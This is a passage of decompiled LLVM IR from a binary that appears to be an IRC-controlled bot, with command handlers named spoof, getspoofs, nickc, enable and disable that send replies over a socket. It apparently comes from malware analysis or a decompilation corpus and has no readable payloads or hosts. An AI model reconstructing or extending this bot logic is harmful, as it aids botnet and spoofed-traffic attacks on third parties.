  store i32 %v1_8048db8, i32* %v2_8048d98, align 4
  br label %dec_label_pc_8048dfd

dec_label_pc_8048dc1:                             ; preds = %dec_label_pc_8048d95
  %v0_8048dc4 = load i32, i32* @ebp, align 4
  %v2_8048dc4 = add i32 %storemerge10.in97, -5188
  %v3_8048dc4 = add i32 %v2_8048dc4, %v0_8048dc4
  %v4_8048dc4 = inttoptr i32 %v3_8048dc4 to i8*
  %v5_8048dc4 = load i8, i8* %v4_8048dc4, align 1
  %v6_8048dc4 = zext i8 %v5_8048dc4 to i32
  store i32 %v6_8048dc4, i32* @edx, align 4
  %v4_8048dd9 = call i32 @putc_unlocked(i8 %v5_8048dc4, i32 %v3_8048cd2)
  br label %dec_label_pc_8048dfd

dec_label_pc_8048de0:                             ; preds = %dec_label_pc_8048d85
  %v0_8048de3 = load i32, i32* @ebp, align 4
  %v2_8048de3 = add i32 %storemerge10.in97, -5188
  %v3_8048de3 = add i32 %v2_8048de3, %v0_8048de3
  %v4_8048de3 = inttoptr i32 %v3_8048de3 to i8*
  %v5_8048de3 = load i8, i8* %v4_8048de3, align 1
  %v6_8048de3 = zext i8 %v5_8048de3 to i32
  store i32 %v6_8048de3, i32* @edx, align 4
  %v4_8048df8 = call i32 @__GI_fputc(i8 %v5_8048de3, i32 %v3_8048cd2)
  br label %dec_label_pc_8048dfd

dec_label_pc_8048dfd:                             ; preds = %dec_label_pc_8048dc1, %dec_label_pc_8048da5, %dec_label_pc_8048de0
  %v4_8048dfd = add i32 %storemerge10.in97, 1
  %v10_8048e03 = icmp ult i32 %v4_8048dfd, %v5_8048cfa112
  store i1 %v10_8048e03, i1* %cf.global-to-local, align 1
  %exitcond117 = icmp eq i32 %v4_8048dfd, %v5_8048cfa112
  br i1 %exitcond117, label %dec_label_pc_8048e22, label %dec_label_pc_8048d85

dec_label_pc_8048e0e:                             ; preds = %dec_label_pc_8048d2c
  %v4_8048e0e = add nuw nsw i32 %storemerge5107, 1
  %v10_8048e14 = icmp ult i32 %v4_8048e0e, %v5_8048cfa112
  store i1 %v10_8048e14, i1* %cf.global-to-local, align 1
  %v5_8048e17 = icmp slt i32 %v4_8048e0e, %v5_8048cfa112
  br i1 %v5_8048e17, label %dec_label_pc_8048d2c, label %dec_label_pc_8048cda.loopexit

dec_label_pc_8048e22.loopexit12:                  ; preds = %dec_label_pc_8048cda.loopexit, %dec_label_pc_8048c74
  %.pre23 = add i32 %v3_8048cd2, 52
  %.pre24 = inttoptr i32 %.pre23 to i32*
  %.pre25 = add i32 %v3_8048cd2, 16
  %.pre26 = inttoptr i32 %.pre25 to i32*
  %.pre27 = add i32 %v3_8048cd2, 28
  %.pre28 = inttoptr i32 %.pre27 to i32*
  br label %dec_label_pc_8048e22

dec_label_pc_8048e22:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048dfd, %dec_label_pc_8048e22.loopexit12
  %v2_8048eb0.pre-phi = phi i32* [ %.pre28, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d9e, %dec_label_pc_8048dfd ], [ %v2_8048d9e, %dec_label_pc_8048d7f ]
  %v2_8048eaa.pre-phi = phi i32* [ %.pre26, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d98, %dec_label_pc_8048dfd ], [ %v2_8048d98, %dec_label_pc_8048d7f ]
  %v2_8048ea0.pre-phi = phi i32* [ %.pre24, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d8e, %dec_label_pc_8048dfd ], [ %v2_8048d8e, %dec_label_pc_8048d7f ]
  store i1 %v5_8048cc2, i1* %cf.global-to-local, align 1
  %v3_8048e43 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_805a914.47 to i32))
  %v5_8048e6883 = call i32 @recv(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp6886 = icmp slt i32 %v5_8048e6883, 1
  br i1 %tmp6886, label %dec_label_pc_8048f23, label %dec_label_pc_8048e7a

dec_label_pc_8048e48.loopexit:                    ; preds = %dec_label_pc_8048f0f
  %v5_8048e68 = call i32 @recv(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp68 = icmp slt i32 %v5_8048e68, 1
  br i1 %tmp68, label %dec_label_pc_8048f23, label %dec_label_pc_8048e7a

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048e22, %dec_label_pc_8048e48.loopexit
  %v5_8048e6887 = phi i32 [ %v5_8048e68, %dec_label_pc_8048e48.loopexit ], [ %v5_8048e6883, %dec_label_pc_8048e22 ]
  %v4_8048e7a = add i32 %v5_8048e6887, -4095
  %v8_8048e7a = icmp ult i32 %v5_8048e6887, 4095
  %v9_8048e7a = sub i32 4094, %v5_8048e6887
  %v10_8048e7a = and i32 %v9_8048e7a, %v5_8048e6887
  %v11_8048e7a = icmp slt i32 %v10_8048e7a, 0
  store i1 %v8_8048e7a, i1* %cf.global-to-local, align 1
  %v12_8048e7a = icmp eq i32 %v4_8048e7a, 0
  %v13_8048e7a = icmp slt i32 %v4_8048e7a, 0
  %v3_8048e81 = icmp eq i1 %v13_8048e7a, %v11_8048e7a
  %v4_8048e81 = icmp eq i1 %v12_8048e7a, false
  %v5_8048e81 = and i1 %v4_8048e81, %v3_8048e81
  br i1 %v5_8048e81, label %dec_label_pc_8048e97.lr.ph, label %dec_label_pc_8048e83

dec_label_pc_8048e83:                             ; preds = %dec_label_pc_8048e7a
  %v0_8048e86 = load i32, i32* @ebp, align 4
  %v2_8048e86 = add i32 %v5_8048e6887, -5188
  %v3_8048e86 = add i32 %v2_8048e86, %v0_8048e86
  %v4_8048e86 = inttoptr i32 %v3_8048e86 to i8*
  store i8 0, i8* %v4_8048e86, align 1
  br label %dec_label_pc_8048e97.lr.ph

dec_label_pc_8048e97.lr.ph:                       ; preds = %dec_label_pc_8048e83, %dec_label_pc_8048e7a
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048e97

dec_label_pc_8048e97:                             ; preds = %dec_label_pc_8048f0f, %dec_label_pc_8048e97.lr.ph
  %storemerge82 = phi i32 [ 0, %dec_label_pc_8048e97.lr.ph ], [ %v4_8048f0f, %dec_label_pc_8048f0f ]
  %v3_8048ea0 = load i32, i32* %v2_8048ea0.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048ea3 = icmp eq i32 %v3_8048ea0, 0
  br i1 %v1_8048ea3, label %dec_label_pc_8048ef2, label %dec_label_pc_8048ea7

dec_label_pc_8048ea7:                             ; preds = %dec_label_pc_8048e97
  %v3_8048eaa = load i32, i32* %v2_8048eaa.pre-phi, align 4
  store i32 %v3_8048eaa, i32* %edx.global-to-local, align 4
  %v3_8048eb0 = load i32, i32* %v2_8048eb0.pre-phi, align 4
  %v7_8048eb3 = icmp ult i32 %v3_8048eaa, %v3_8048eb0
  store i1 %v7_8048eb3, i1* %cf.global-to-local, align 1
  %v1_8048eb5 = icmp eq i1 %v7_8048eb3, false
  br i1 %v1_8048eb5, label %dec_label_pc_8048ed3, label %dec_label_pc_8048eb7

dec_label_pc_8048eb7:                             ; preds = %dec_label_pc_8048ea7
  %v3_8048eba = load i32, i32* %v2_8048eaa.pre-phi, align 4
  store i32 %v3_8048eba, i32* %edx.global-to-local, align 4
  %v0_8048ec0 = load i32, i32* @ebp, align 4
  %v2_8048ec0 = add nsw i32 %storemerge82, -5188
  %v3_8048ec0 = add i32 %v2_8048ec0, %v0_8048ec0
  %v4_8048ec0 = inttoptr i32 %v3_8048ec0 to i8*
  %v5_8048ec0 = load i8, i8* %v4_8048ec0, align 1
  %v3_8048ec8 = inttoptr i32 %v3_8048eba to i8*
  store i8 %v5_8048ec0, i8* %v3_8048ec8, align 1
  %v0_8048eca = load i32, i32* %edx.global-to-local, align 4
  %v1_8048eca = add i32 %v0_8048eca, 1
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  store i32 %v1_8048eca, i32* %v2_8048eaa.pre-phi, align 4
  br label %dec_label_pc_8048f0f

dec_label_pc_8048ed3:                             ; preds = %dec_label_pc_8048ea7
  %v0_8048ed6 = load i32, i32* @ebp, align 4
  %v2_8048ed6 = add nsw i32 %storemerge82, -5188
  %v3_8048ed6 = add i32 %v2_8048ed6, %v0_8048ed6
  %v4_8048ed6 = inttoptr i32 %v3_8048ed6 to i8*
  %v5_8048ed6 = load i8, i8* %v4_8048ed6, align 1
  %v6_8048ed6 = zext i8 %v5_8048ed6 to i32
  store i32 %v6_8048ed6, i32* @edx, align 4
  %v4_8048eeb = call i32 @putc_unlocked(i8 %v5_8048ed6, i32 %v3_8048cd2)
  br label %dec_label_pc_8048f0f

dec_label_pc_8048ef2:                             ; preds = %dec_label_pc_8048e97
  %v0_8048ef5 = load i32, i32* @ebp, align 4
  %v2_8048ef5 = add nsw i32 %storemerge82, -5188
  %v3_8048ef5 = add i32 %v2_8048ef5, %v0_8048ef5
  %v4_8048ef5 = inttoptr i32 %v3_8048ef5 to i8*
  %v5_8048ef5 = load i8, i8* %v4_8048ef5, align 1
  %v6_8048ef5 = zext i8 %v5_8048ef5 to i32
  store i32 %v6_8048ef5, i32* @edx, align 4
  %v4_8048f0a = call i32 @__GI_fputc(i8 %v5_8048ef5, i32 %v3_8048cd2)
  br label %dec_label_pc_8048f0f

dec_label_pc_8048f0f:                             ; preds = %dec_label_pc_8048ed3, %dec_label_pc_8048eb7, %dec_label_pc_8048ef2
  %v4_8048f0f = add nuw nsw i32 %storemerge82, 1
  %v10_8048f15 = icmp ult i32 %v4_8048f0f, %v5_8048e6887
  store i1 %v10_8048f15, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048f0f, %v5_8048e6887
  br i1 %exitcond, label %dec_label_pc_8048e48.loopexit, label %dec_label_pc_8048e97

dec_label_pc_8048f23:                             ; preds = %dec_label_pc_8048e48.loopexit, %dec_label_pc_8048e22
  %v1_8048f29 = inttoptr i32 %v3_8048cd2 to i16*
  %v2_8048f29 = call i32 @__GI_fclose(i16* %v1_8048f29)
  %v1_8048f34 = call i32 @close(i32 %v4_8048a86)
  %v1_8048f40 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048f45

dec_label_pc_8048f45:                             ; preds = %entry, %dec_label_pc_8048f23
  %v0_8048f4e = phi i32 [ %v1_8048a36, %entry ], [ %v1_8048f40, %dec_label_pc_8048f23 ]
  %v0_8048f45 = load i32, i32* @esp, align 4
  %v2_8048f45 = icmp ugt i32 %v0_8048f45, -5233
  store i1 %v2_8048f45, i1* %cf.global-to-local, align 1
  ret i32 %v0_8048f4e

; uselistorder directives
  uselistorder i32 %storemerge82, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048e7a, { 1, 0 }
  uselistorder i32 %v5_8048e6887, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048eaa.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8048e0e, { 1, 0, 2 }
  uselistorder i32 %v4_8048dfd, { 1, 2, 0 }
  uselistorder i32 %storemerge10.in97, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048d68, { 1, 0 }
  uselistorder i32 %v7_8048d66, { 1, 0 }
  uselistorder i32 %storemerge5107, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048d0c, { 1, 0 }
  uselistorder i32 %v5_8048cfa112, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048cea, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 %v3_8048cd2, { 10, 9, 8, 0, 1, 2, 6, 3, 5, 4, 7 }
  uselistorder i32 %v1_8048bad, { 1, 0, 2 }
  uselistorder i32 %storemerge6, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048b4c.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_8048b29, { 2, 0, 1 }
  uselistorder i1 %v0_8048af1, { 1, 0 }
  uselistorder i32 %v4_8048a86, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8048a43, { 1, 0 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 5, 8, 6, 7, 0, 9, 10, 1, 11, 18, 14, 12, 13, 2, 15, 16, 17, 3, 19, 20, 4, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 -1092, { 1, 0 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048f45, { 1, 0 }
  uselistorder label %dec_label_pc_8048f0f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048e7a, { 1, 0 }
  uselistorder label %dec_label_pc_8048e22, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048dfd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048d85, { 1, 0 }
  uselistorder label %dec_label_pc_8048d2c, { 1, 0 }
  uselistorder label %dec_label_pc_8048d0c, { 1, 0 }
  uselistorder label %dec_label_pc_8048c74, { 1, 0 }
  uselistorder label %dec_label_pc_8048c1d, { 1, 0 }
  uselistorder label %dec_label_pc_8048bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8048b49, { 1, 0 }
  uselistorder label %dec_label_pc_8048b3d, { 1, 0 }
  uselistorder label %dec_label_pc_8048aba, { 1, 0 }
  uselistorder label %dec_label_pc_8048a6f, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp34 = call i8 @__decompiler_undefined_function_5()
  %v0_8048f58 = load i8*, i8** @global_var_8062e28.32, align 4
  %v1_8048f58 = ptrtoint i8* %v0_8048f58 to i32
  %v0_8048f60 = load i64, i64* @global_var_8062e2c.33, align 8
  %v1_8048f60 = trunc i64 %v0_8048f60 to i32
  %v9_8048f77 = icmp eq i32 %v1_8048f60, 1
  %v1_8048f7a = icmp eq i1 %v9_8048f77, false
  br i1 %v1_8048f7a, label %dec_label_pc_8048fd6, label %dec_label_pc_8048f7c

dec_label_pc_8048f7c:                             ; preds = %entry
  %v1_8048f82 = urem i32 %v1_8048f58, 256
  store i32 %v1_8048f82, i32* @ebx, align 4
  %v3_8048fcc = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_805a92c.48 to i32))
  br label %dec_label_pc_8049072

dec_label_pc_8048fd6:                             ; preds = %entry
  %v3_8048fef17 = zext i8 %tmp34 to i32
  store i32 %v3_8048fef17, i32* @ebx, align 4
  %v3_8048ffb18 = zext i8 %tmp33 to i32
  store i32 %v3_8048ffb18, i32* @esi, align 4
  %v1_8049007 = urem i32 %v1_8048f58, 256
  store i32 %v1_8049007, i32* @edi, align 4
  %v3_804906d = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_805a94c.49 to i32))
  br label %dec_label_pc_8049072

dec_label_pc_8049072:                             ; preds = %dec_label_pc_8048f7c, %dec_label_pc_8048fd6
  %storemerge = phi i32 [ %v3_804906d, %dec_label_pc_8048fd6 ], [ %v3_8048fcc, %dec_label_pc_8048f7c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049072, { 1, 0 }
}

define i32 @version(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804907a = load i32, i32* @ebp, align 4
  store i32 %v0_804907a, i32* %stack_var_-4, align 4
  %v4_804907a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804907a, i32* @ebp, align 4
  %v3_8049095 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_805a97a.50 to i32))
  ret i32 %v3_8049095

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_80490a3 = icmp eq i32 %arg3, 1
  br i1 %v12_80490a3, label %dec_label_pc_80490c5, label %dec_label_pc_80490a9

dec_label_pc_80490a9:                             ; preds = %entry
  %v3_80490be = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_805a997.51 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_80490c5:                             ; preds = %entry
  %v1_80490c8 = add i32 %arg4, 4
  %v1_80490cb = inttoptr i32 %v1_80490c8 to i32*
  %v2_80490cb = load i32, i32* %v1_80490cb, align 4
  store i1 false, i1* @df, align 1
  %v4_80490d8 = inttoptr i32 %v2_80490cb to i8*
  store i32 %v2_80490cb, i32* @edi, align 4
  %v3_80490db = call i32 @_strlen(i8* %v4_80490d8)
  %v4_80490db = mul i32 %v3_80490db, -1
  %v1_80490e1 = sub i32 0, %v4_80490db
  %v5_80490e2 = icmp ult i32 %v1_80490e1, 9
  %v9_80490e2 = icmp eq i32 %v4_80490db, -9
  %v2_80490e5 = or i1 %v5_80490e2, %v9_80490e2
  br i1 %v2_80490e5, label %dec_label_pc_8049103, label %dec_label_pc_80490e7

dec_label_pc_80490e7:                             ; preds = %dec_label_pc_80490c5
  %v3_80490fc = call i32 @Send(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_805a9b0.52 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_8049103:                             ; preds = %dec_label_pc_80490c5
  %v3_804911d = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_805a9e5.53 to i32))
  br label %dec_label_pc_8049122

dec_label_pc_8049122:                             ; preds = %dec_label_pc_80490e7, %dec_label_pc_80490a9, %dec_label_pc_8049103
  %v0_8049127 = phi i32 [ %v3_80490fc, %dec_label_pc_80490e7 ], [ %v3_80490be, %dec_label_pc_80490a9 ], [ %v3_804911d, %dec_label_pc_8049103 ]
  ret i32 %v0_8049127

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049122, { 2, 0, 1 }
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_804912f = icmp eq i32 %arg3, 1
  br i1 %v12_804912f, label %dec_label_pc_8049190, label %dec_label_pc_8049135

dec_label_pc_8049135:                             ; preds = %entry
  %v3_804914a = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_805a9ee.54 to i32))
  %v3_8049186 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_805aa30.57 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_8049190:                             ; preds = %entry
  %v0_8049190 = load i8, i8* @global_var_8062e24.27, align 4
  %v4_8049197 = icmp eq i8 %v0_8049190, 0
  br i1 %v4_8049197, label %dec_label_pc_80491ba, label %dec_label_pc_804919b

dec_label_pc_804919b:                             ; preds = %dec_label_pc_8049190
  %v3_80491b0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805aa53.58 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_80491ba:                             ; preds = %dec_label_pc_8049190
  %v1_80491bd = add i32 %arg4, 4
  %v1_80491c0 = inttoptr i32 %v1_80491bd to i32*
  %v2_80491c0 = load i32, i32* %v1_80491c0, align 4
  store i1 false, i1* @df, align 1
  %v4_80491cd = inttoptr i32 %v2_80491c0 to i8*
  store i32 %v2_80491c0, i32* @edi, align 4
  %v3_80491d0 = call i32 @_strlen(i8* %v4_80491cd)
  %v4_80491d0 = mul i32 %v3_80491d0, -1
  %v1_80491d6 = sub i32 0, %v4_80491d0
  %v5_80491d7 = icmp ult i32 %v1_80491d6, 254
  %v9_80491d7 = icmp eq i32 %v4_80491d0, -254
  %v2_80491dc = or i1 %v5_80491d7, %v9_80491d7
  br i1 %v2_80491dc, label %dec_label_pc_80491fa, label %dec_label_pc_80491de

dec_label_pc_80491de:                             ; preds = %dec_label_pc_80491ba
  %v3_80491f3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_805aa74.59 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_80491fa:                             ; preds = %dec_label_pc_80491ba
  store i8 1, i8* @global_var_8062e24.27, align 4
  %v5_804921a = call i32 @__GI_memset(i8* bitcast (i32* @global_var_80677c0.60 to i8*), i32 0, i32 256)
  %v2_8049225 = load i32, i32* %v1_80491c0, align 4
  store i32 %v2_8049225, i32* @eax, align 4
  %v4_8049232 = call i32 @strcpy(i8* bitcast (i32* @global_var_80677c0.60 to i8*), i32 %v2_8049225)
  %v3_8049245 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_805aa9c.61 to i32))
  br label %dec_label_pc_804924a

dec_label_pc_804924a:                             ; preds = %dec_label_pc_80491de, %dec_label_pc_804919b, %dec_label_pc_8049135, %dec_label_pc_80491fa
  %v0_804924f = phi i32 [ %v3_80491f3, %dec_label_pc_80491de ], [ %v3_80491b0, %dec_label_pc_804919b ], [ %v3_8049186, %dec_label_pc_8049135 ], [ %v3_8049245, %dec_label_pc_80491fa ]
  ret i32 %v0_804924f

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804924a, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8049256 = icmp eq i32 %arg3, 1
  br i1 %v12_8049256, label %dec_label_pc_80492b7, label %dec_label_pc_804925c

dec_label_pc_804925c:                             ; preds = %entry
  %v3_8049271 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_805aabb.62 to i32))
  %v3_80492ad = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_805aa30.57 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_80492b7:                             ; preds = %entry
  %v0_80492b7 = load i8, i8* @global_var_8062e24.27, align 4
  %v4_80492be = icmp eq i8 %v0_80492b7, 0
  %v1_80492c0 = icmp eq i1 %v4_80492be, false
  br i1 %v1_80492c0, label %dec_label_pc_80492de, label %dec_label_pc_80492c2

dec_label_pc_80492c2:                             ; preds = %dec_label_pc_80492b7
  %v3_80492d7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_805aad5.63 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_80492de:                             ; preds = %dec_label_pc_80492b7
  %v1_80492e1 = add i32 %arg4, 4
  %v1_80492e4 = inttoptr i32 %v1_80492e1 to i32*
  %v2_80492e4 = load i32, i32* %v1_80492e4, align 4
  %v4_80492f1 = call i32 @__GI_strcasecmp(i8* bitcast (i32* @global_var_80677c0.60 to i8*), i32 %v2_80492e4)
  %v1_80492f6 = icmp eq i32 %v4_80492f1, 0
  br i1 %v1_80492f6, label %dec_label_pc_8049316, label %dec_label_pc_80492fa

dec_label_pc_80492fa:                             ; preds = %dec_label_pc_80492de
  %v3_804930f = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_805aaf2.64 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_8049316:                             ; preds = %dec_label_pc_80492de
  store i8 0, i8* @global_var_8062e24.27, align 4
  %v3_8049332 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_805ab0d.65 to i32))
  br label %dec_label_pc_8049337

dec_label_pc_8049337:                             ; preds = %dec_label_pc_80492fa, %dec_label_pc_80492c2, %dec_label_pc_804925c, %dec_label_pc_8049316
  %v0_8049338 = phi i32 [ %v3_804930f, %dec_label_pc_80492fa ], [ %v3_80492d7, %dec_label_pc_80492c2 ], [ %v3_80492ad, %dec_label_pc_804925c ], [ %v3_8049332, %dec_label_pc_8049316 ]
  ret i32 %v0_8049338

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049337, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_8049343 = icmp eq i32 %arg3, 1
  br i1 %v12_8049343, label %dec_label_pc_804937c, label %dec_label_pc_8049349

dec_label_pc_8049349:                             ; preds = %entry
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804935e = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_805ab2c.66 to i32))
  store i32 %v3_804935e, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_8062e28.32, align 8
  store i64 0, i64* @global_var_8062e2c.33, align 8
  br label %dec_label_pc_8049517

dec_label_pc_804937c:                             ; preds = %entry
  %v1_804937f = add i32 %arg4, 4
  store i32 %v1_804937f, i32* %eax.global-to-local, align 4
  %v1_8049382 = inttoptr i32 %v1_804937f to i32*
  %v2_8049382 = load i32, i32* %v1_8049382, align 4
  %v1_804938f = and i32 %v2_8049382, -256
  store i32 %v1_804938f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049392 = inttoptr i32 %v2_8049382 to i8*
  store i32 %v2_8049382, i32* @edi, align 4
  %v3_8049398 = call i32 @_strlen(i8* %v4_8049392)
  %v4_8049398 = mul i32 %v3_8049398, -1
  %v1_804939e = sub i32 0, %v4_8049398
  store i32 %v1_804939e, i32* %eax.global-to-local, align 4
  %v2_804939f = icmp ult i32 %v1_804939e, 16
  %v6_804939f = icmp eq i32 %v4_8049398, -16
  %v2_80493a2 = or i1 %v2_804939f, %v6_804939f
  br i1 %v2_80493a2, label %dec_label_pc_80493c3, label %dec_label_pc_80493a4

dec_label_pc_80493a4:                             ; preds = %dec_label_pc_804937c
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_80493b9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_805ab4c.67 to i32))
  store i32 %v3_80493b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049517

dec_label_pc_80493c3:                             ; preds = %dec_label_pc_804937c
  store i32 %v1_804937f, i32* %eax.global-to-local, align 4
  %v2_80493c9 = load i32, i32* %v1_8049382, align 4
  %v2_80493cf = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_80493cf, i32* @eax, align 4
  %v3_80493d8 = bitcast i32* %stack_var_-276 to i8*
  %v4_80493d8 = call i32 @strcpy(i8* %v3_80493d8, i32 %v2_80493c9)
  %v2_80493ee = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_80493f7 = call i32 @_strlen(i8* %v3_80493d8)
  %v1_80493fe = add i32 %v3_80493f7, -1
  store i32 %v1_80493fe, i32* %eax.global-to-local, align 4
  %v0_80493ff = load i32, i32* @ebp, align 4
  %v2_80493ff = add i32 %v3_80493f7, -273
  %v3_80493ff = add i32 %v2_80493ff, %v0_80493ff
  %v4_80493ff = inttoptr i32 %v3_80493ff to i8*
  %v5_80493ff = load i8, i8* %v4_80493ff, align 1
  %v6_80493ff = zext i8 %v5_80493ff to i32
  store i32 %v6_80493ff, i32* %eax.global-to-local, align 4
  %v10_8049407 = icmp eq i8 %v5_80493ff, 46
  %v1_8049409 = icmp eq i1 %v10_8049407, false
  br i1 %v1_8049409, label %dec_label_pc_804945a, label %dec_label_pc_804940b

dec_label_pc_804940b:                             ; preds = %dec_label_pc_80493c3
  store i32 %v2_80493ee, i32* %eax.global-to-local, align 4
  %v3_8049425 = call i32 @_strlen(i8* %v3_80493d8)
  %v1_804942c = add i32 %v3_8049425, -1
  store i32 %v1_804942c, i32* %eax.global-to-local, align 4
  %v0_804942d = load i32, i32* @ebp, align 4
  %v2_804942d = add i32 %v3_8049425, -273
  %v3_804942d = add i32 %v2_804942d, %v0_804942d
  %v4_804942d = inttoptr i32 %v3_804942d to i8*
  store i8 0, i8* %v4_804942d, align 1
  br label %dec_label_pc_804945a

dec_label_pc_8049445:                             ; preds = %dec_label_pc_804945a
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_8049448 = load i32, i32* @ebp, align 4
  %v2_8049448 = add i32 %stack_var_-20.0, -272
  %v3_8049448 = add i32 %v2_8049448, %v0_8049448
  %v4_8049448 = inttoptr i32 %v3_8049448 to i8*
  %v5_8049448 = load i8, i8* %v4_8049448, align 1
  %v6_8049448 = zext i8 %v5_8049448 to i32
  store i32 %v6_8049448, i32* %eax.global-to-local, align 4
  %v10_8049450 = icmp eq i8 %v5_8049448, 46
  %v1_8049452 = icmp eq i1 %v10_8049450, false
  br i1 %v1_8049452, label %dec_label_pc_8049457, label %dec_label_pc_8049454

dec_label_pc_8049454:                             ; preds = %dec_label_pc_8049445
  %v4_8049454 = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_8049457

dec_label_pc_8049457:                             ; preds = %dec_label_pc_8049445, %dec_label_pc_8049454
  %stack_var_-16.0 = phi i32 [ %stack_var_-16.1, %dec_label_pc_8049445 ], [ %v4_8049454, %dec_label_pc_8049454 ]
  %v4_8049457 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_804945a

dec_label_pc_804945a:                             ; preds = %dec_label_pc_804940b, %dec_label_pc_80493c3, %dec_label_pc_8049457
